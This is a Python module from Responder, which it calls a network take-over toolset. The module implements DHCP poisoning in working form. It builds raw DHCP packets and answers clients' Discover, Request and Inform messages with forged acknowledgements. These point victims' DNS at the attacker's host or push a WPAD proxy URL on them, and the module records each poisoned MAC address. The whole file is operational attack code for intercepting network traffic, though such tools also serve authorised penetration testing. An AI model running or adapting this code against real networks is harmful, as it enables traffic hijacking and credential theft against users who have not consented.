#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools
# created and maintained by Laurent Gaffie.
# email: laurent.gaffie@gmail.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys

if sys.version_info < (3, 0):
    sys.exit("This script is meant to be run with Python3")

import struct
import random
import optparse
import configparser
import os
import codecs
import netifaces
import binascii

BASEDIR = os.path.realpath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, BASEDIR)
from responder.src.odict import OrderedDict
from responder.src.utils import *
from responder.src import settings


def color(txt, code=1, modifier=0):
    return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)


# Python version
if sys.version_info > (3, 0):
    PY2OR3 = "PY3"
else:
    PY2OR3 = "PY2"


def StructWithLenPython2or3(endian, data):
    # Python2...
    if PY2OR3 == "PY2":
        return struct.pack(endian, data)
    # Python3...
    else:
        return struct.pack(endian, data).decode("latin-1")


def NetworkSendBufferPython2or3(data):
    if PY2OR3 == "PY2":
        return str(data)
    else:
        return bytes(str(data), "latin-1")


def NetworkRecvBufferPython2or3(data):
    if PY2OR3 == "PY2":
        return str(data)
    else:
        return str(data.decode("latin-1"))


class Packet:
    fields = OrderedDict(
        [
            ("data", ""),
        ]
    )

    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k, v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v

    def __str__(self):
        return "".join(map(str, self.fields.values()))


config = configparser.ConfigParser()
try:
    config.read(os.path.join(BASEDIR, "Responder.conf"))
    RespondTo = [
        _f
        for _f in [
            x.upper().strip()
            for x in config.get("Responder Core", "RespondTo").strip().split(",")
        ]
        if _f
    ]
    DontRespondTo = [
        _f
        for _f in [
            x.upper().strip()
            for x in config.get("Responder Core", "DontRespondTo").strip().split(",")
        ]
        if _f
    ]
except (configparser.NoSectionError, configparser.NoOptionError, FileNotFoundError):
    # Fallback to empty lists if config not available
    RespondTo = []
    DontRespondTo = []

# These will be properly set when the main settings are populated
Interface = getattr(settings.Config, 'Interface', None)
Responder_IP = RespondWithIP() if Interface else '127.0.0.1'
ROUTERIP = Responder_IP  # Set to Responder_IP in case we fall on a static IP network and we don't get a DHCP Offer. This var will be updated with the real dhcp IP if present.
NETMASK = "255.255.255.0"
DNSIP = "0.0.0.0"
DNSIP2 = "0.0.0.0"
DNSNAME = "local"
WPADSRV = "http://" + Responder_IP + "/wpad.dat"
Respond_To_Requests = True
DHCPClient = []


def GetMacAddress(Interface):
    try:
        mac = netifaces.ifaddresses(Interface)[netifaces.AF_LINK][0]["addr"]
        return binascii.unhexlify(mac.replace(":", "")).decode("latin-1")
    except:
        mac = "00:00:00:00:00:00"
        return binascii.unhexlify(mac.replace(":", "")).decode("latin-1")


##### IP Header #####
class IPHead(Packet):
    fields = OrderedDict(
        [
            ("Version", "\x45"),
            ("DiffServices", "\x00"),
            ("TotalLen", "\x00\x00"),
            ("Ident", "\x00\x00"),
            ("Flags", "\x00\x00"),
            ("TTL", "\x40"),
            ("Protocol", "\x11"),
            ("Checksum", "\x00\x00"),
            ("SrcIP", ""),
            ("DstIP", ""),
        ]
    )


class UDP(Packet):
    fields = OrderedDict(
        [
            ("SrcPort", "\x00\x43"),
            ("DstPort", "\x00\x44"),
            ("Len", "\x00\x00"),
            ("Checksum", "\x00\x00"),
            ("Data", "\x00\x00"),
        ]
    )

    def calculate(self):
        self.fields["Len"] = StructWithLenPython2or3(
            ">h", len(str(self.fields["Data"])) + 8
        )


class DHCPDiscover(Packet):
    fields = OrderedDict(
        [
            ("MessType", "\x01"),
            ("HdwType", "\x01"),
            ("HdwLen", "\x06"),
            ("Hops", "\x00"),
            ("Tid", os.urandom(4).decode("latin-1")),
            ("ElapsedSec", "\x00\x01"),
            ("BootpFlags", "\x80\x00"),
            ("ActualClientIP", "\x00\x00\x00\x00"),
            ("GiveClientIP", "\x00\x00\x00\x00"),
            ("NextServerIP", "\x00\x00\x00\x00"),
            ("RelayAgentIP", "\x00\x00\x00\x00"),
            ("ClientMac", os.urandom(6).decode("latin-1")),  # Needs to be random.
            ("ClientMacPadding", "\x00" * 10),
            ("ServerHostname", "\x00" * 64),
            ("BootFileName", "\x00" * 128),
            ("MagicCookie", "\x63\x82\x53\x63"),
            ("DHCPCode", "\x35"),  # DHCP Message
            ("DHCPCodeLen", "\x01"),
            ("DHCPOpCode", "\x01"),  # Msgtype(Discover)
            ("Op55", "\x37"),
            ("Op55Len", "\x0b"),
            (
                "Op55Str",
                "\x01\x03\x0c\x0f\x06\x1a\x21\x79\x77\x2a\x78",
            ),  # Requested info.
            ("Op12", "\x0c"),
            ("Op12Len", "\x09"),
            ("Op12Str", settings.Config.DHCPHostname),  # random str.
            ("Op255", "\xff"),
            ("Padding", "\x00"),
        ]
    )

    def calculate(self):
        self.fields["ClientMac"] = GetMacAddress(Interface)


class DHCPACK(Packet):
    fields = OrderedDict(
        [
            ("MessType", "\x02"),
            ("HdwType", "\x01"),
            ("HdwLen", "\x06"),
            ("Hops", "\x00"),
            ("Tid", "\x11\x22\x33\x44"),
            ("ElapsedSec", "\x00\x00"),
            ("BootpFlags", "\x00\x00"),
            ("ActualClientIP", "\x00\x00\x00\x00"),
            ("GiveClientIP", "\x00\x00\x00\x00"),
            ("NextServerIP", "\x00\x00\x00\x00"),
            ("RelayAgentIP", "\x00\x00\x00\x00"),
            ("ClientMac", "\xff\xff\xff\xff\xff\xff"),
            ("ClientMacPadding", "\x00" * 10),
            ("ServerHostname", "\x00" * 64),
            ("BootFileName", "\x00" * 128),
            ("MagicCookie", "\x63\x82\x53\x63"),
            ("DHCPCode", "\x35"),  # DHCP Message
            ("DHCPCodeLen", "\x01"),
            ("DHCPOpCode", "\x05"),  # Msgtype(ACK)
            ("Op54", "\x36"),
            ("Op54Len", "\x04"),
            ("Op54Str", ""),  # DHCP Server
            ("Op51", "\x33"),
            ("Op51Len", "\x04"),
            ("Op51Str", "\x00\x00\x00\x0a"),  # Lease time
            ("Op1", "\x01"),
            ("Op1Len", "\x04"),
            ("Op1Str", ""),  # Netmask
            ("Op15", "\x0f"),
            ("Op15Len", "\x0e"),
            ("Op15Str", ""),  # DNS Name
            ("Op3", "\x03"),
            ("Op3Len", "\x04"),
            ("Op3Str", ""),  # Router
            ("Op6", "\x06"),
            ("Op6Len", "\x08"),
            ("Op6Str", ""),  # DNS Servers
            ("Op252", ""),
            ("Op252Len", ""),
            ("Op252Str", ""),  # Wpad Server
            ("Op255", "\xff"),
            ("Padding", "\x00"),
        ]
    )

    def calculate(self, DHCP_DNS):
        self.fields["Op54Str"] = socket.inet_aton(ROUTERIP).decode("latin-1")
        self.fields["Op1Str"] = socket.inet_aton(NETMASK).decode("latin-1")
        self.fields["Op3Str"] = socket.inet_aton(ROUTERIP).decode("latin-1")
        self.fields["Op6Str"] = socket.inet_aton(DNSIP).decode(
            "latin-1"
        ) + socket.inet_aton(DNSIP2).decode("latin-1")
        self.fields["Op15Str"] = DNSNAME
        if DHCP_DNS:
            self.fields["Op6Str"] = socket.inet_aton(RespondWithIP()).decode(
                "latin-1"
            ) + socket.inet_aton(DNSIP2).decode("latin-1")
        else:
            self.fields["Op252"] = "\xfc"
            self.fields["Op252Str"] = WPADSRV
            self.fields["Op252Len"] = StructWithLenPython2or3(
                ">b", len(str(self.fields["Op252Str"]))
            )

        self.fields["Op51Str"] = StructWithLenPython2or3(">L", random.randrange(10, 20))
        self.fields["Op15Len"] = StructWithLenPython2or3(
            ">b", len(str(self.fields["Op15Str"]))
        )


def RespondToThisIP(ClientIp):
    if ClientIp.startswith("127.0.0."):
        return False
    elif RespondTo and ClientIp not in RespondTo:
        return False
    elif ClientIp in RespondTo or RespondTo == []:
        if ClientIp not in DontRespondTo:
            return True
    return False


def ParseSrcDSTAddr(data):
    SrcIP = socket.inet_ntoa(data[0][26:30])
    DstIP = socket.inet_ntoa(data[0][30:34])
    SrcPort = struct.unpack(">H", data[0][34:36])[0]
    DstPort = struct.unpack(">H", data[0][36:38])[0]
    return SrcIP, SrcPort, DstIP, DstPort


def FindIP(data):
    IPPos = data.find(b"\x32\x04") + 2
    if IPPos == -1 or IPPos + 4 >= len(data) or IPPos == 1:
        # Probably not present in the DHCP options we received, let's grab it from the IP header instead
        return data[12:16]
    else:
        IP = data[IPPos : IPPos + 4]
        return IP


def ParseDHCPCode(data, ClientIP, DHCP_DNS):
    global DHCPClient
    global ROUTERIP
    PTid = data[4:8]
    Seconds = data[8:10]
    CurrentIP = socket.inet_ntoa(data[12:16])
    RequestedIP = socket.inet_ntoa(data[16:20])
    MacAddr = data[28:34]
    MacAddrStr = ":".join("%02x" % ord(m) for m in MacAddr.decode("latin-1")).upper()
    OpCode = data[242:243]
    RequestIP = data[245:249]

    if DHCPClient.count(MacAddrStr) >= 4:
        return "'%s' has been poisoned more than 4 times. Ignoring..." % MacAddrStr

    if OpCode == b"\x02" and Respond_To_Requests:  # DHCP Offer
        ROUTERIP = ClientIP
        return "Found DHCP server IP: %s, now waiting for incoming requests..." % (
            ROUTERIP
        )

    elif OpCode == b"\x03" and Respond_To_Requests:  # DHCP Request
        IP = FindIP(data)
        if IP:
            IPConv = socket.inet_ntoa(IP)
            if RespondToThisIP(IPConv):
                IP_Header = IPHead(
                    SrcIP=socket.inet_aton(ROUTERIP).decode("latin-1"),
                    DstIP=IP.decode("latin-1"),
                )
                Packet = DHCPACK(
                    Tid=PTid.decode("latin-1"),
                    ClientMac=MacAddr.decode("latin-1"),
                    GiveClientIP=IP.decode("latin-1"),
                    ElapsedSec=Seconds.decode("latin-1"),
                )
                Packet.calculate(DHCP_DNS)
                Buffer = UDP(Data=Packet)
                Buffer.calculate()
                SendDHCP(str(IP_Header) + str(Buffer), (IPConv, 68))
                DHCPClient.append(MacAddrStr)
                SaveDHCPToDb(
                    {
                        "MAC": MacAddrStr,
                        "IP": CurrentIP,
                        "RequestedIP": IPConv,
                    }
                )
                return "Acknowledged DHCP Request for IP: %s, Req IP: %s, MAC: %s" % (
                    CurrentIP,
                    IPConv,
                    MacAddrStr,
                )

    # DHCP Inform
    elif OpCode == b"\x08":
        IP_Header = IPHead(
            SrcIP=socket.inet_aton(ROUTERIP).decode("latin-1"),
            DstIP=socket.inet_aton(CurrentIP).decode("latin-1"),
        )
        Packet = DHCPACK(
            Tid=PTid.decode("latin-1"),
            ClientMac=MacAddr.decode("latin-1"),
            ActualClientIP=socket.inet_aton(CurrentIP).decode("latin-1"),
            GiveClientIP=socket.inet_aton("0.0.0.0").decode("latin-1"),
            NextServerIP=socket.inet_aton("0.0.0.0").decode("latin-1"),
            RelayAgentIP=socket.inet_aton("0.0.0.0").decode("latin-1"),
            ElapsedSec=Seconds.decode("latin-1"),
        )
        Packet.calculate(DHCP_DNS)
        Buffer = UDP(Data=Packet)
        Buffer.calculate()
        SendDHCP(str(IP_Header) + str(Buffer), (CurrentIP, 68))
        DHCPClient.append(MacAddrStr)
        SaveDHCPToDb(
            {
                "MAC": MacAddrStr,
                "IP": CurrentIP,
                "RequestedIP": RequestedIP,
            }
        )
        return "Acknowledged DHCP Inform for IP: %s, Req IP: %s, MAC: %s" % (
            CurrentIP,
            RequestedIP,
            MacAddrStr,
        )

    elif OpCode == b"\x01" and Respond_To_Requests:  # DHCP Discover
        IP = FindIP(data)
        if IP:
            IPConv = socket.inet_ntoa(IP)
            if RespondToThisIP(IPConv):
                IP_Header = IPHead(
                    SrcIP=socket.inet_aton(ROUTERIP).decode("latin-1"),
                    DstIP=IP.decode("latin-1"),
                )
                Packet = DHCPACK(
                    Tid=PTid.decode("latin-1"),
                    ClientMac=MacAddr.decode("latin-1"),
                    GiveClientIP=IP.decode("latin-1"),
                    DHCPOpCode="\x02",
                    ElapsedSec=Seconds.decode("latin-1"),
                )
                Packet.calculate(DHCP_DNS)
                Buffer = UDP(Data=Packet)
                Buffer.calculate()
                SendDHCP(str(IP_Header) + str(Buffer), (IPConv, 0))
                DHCPClient.append(MacAddrStr)
                SaveDHCPToDb(
                    {
                        "MAC": MacAddrStr,
                        "IP": CurrentIP,
                        "RequestedIP": IPConv,
                    }
                )
                return "Acknowledged DHCP Discover for IP: %s, Req IP: %s, MAC: %s" % (
                    CurrentIP,
                    IPConv,
                    MacAddrStr,
                )


def SendDiscover():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    IP_Header = IPHead(
        SrcIP=socket.inet_aton("0.0.0.0").decode("latin-1"),
        DstIP=socket.inet_aton("255.255.255.255").decode("latin-1"),
    )
    Packet = DHCPDiscover()
    Packet.calculate()
    Buffer = UDP(SrcPort="\x00\x44", DstPort="\x00\x43", Data=Packet)
    Buffer.calculate()
    s.sendto(
        NetworkSendBufferPython2or3(str(IP_Header) + str(Buffer)),
        ("255.255.255.255", 67),
    )


def SendDHCP(packet, Host):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    s.sendto(NetworkSendBufferPython2or3(packet), Host)


def DHCP(DHCP_DNS):
    s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW)
    s.bind((Interface, 0x0800))
    SendDiscover()
    while True:
        data = s.recvfrom(65535)
        if data[0][23:24] == b"\x11":  # is udp?
            SrcIP, SrcPort, DstIP, DstPort = ParseSrcDSTAddr(data)
            if SrcPort == 67 or DstPort == 67:
                ClientIP = socket.inet_ntoa(data[0][26:30])
                ret = ParseDHCPCode(data[0][42:], ClientIP, DHCP_DNS)
                if ret and not settings.Config.Quiet_Mode:
                    print(text("[*] [DHCP] %s" % ret))
